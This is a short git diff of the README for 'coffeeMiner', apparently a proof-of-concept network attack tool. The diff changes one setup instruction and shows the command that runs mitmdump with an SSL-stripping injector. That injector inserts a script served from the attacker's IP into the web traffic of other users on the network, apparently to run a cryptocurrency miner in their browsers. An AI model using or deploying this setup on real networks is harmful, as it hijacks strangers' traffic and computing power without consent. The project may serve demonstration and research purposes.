@@ -22,7 +22,7 @@ A blog post about this project can be read here: http://arnaucode.com/blog/coffe
 bash install.sh
 ```
 - edit whitelist.txt with one IP per line (optional)
-- edit coffeeMiner.py, line 52, with the coffeeMiner httpserver IP:
+- edit coffeeMiner.py config, beginning line 3:
 ```py
 os.system("~/.local/bin/mitmdump -s 'sslstrip_injector.py http://[YOUR_IP_HERE]:8000/script.js' -T")
 ```
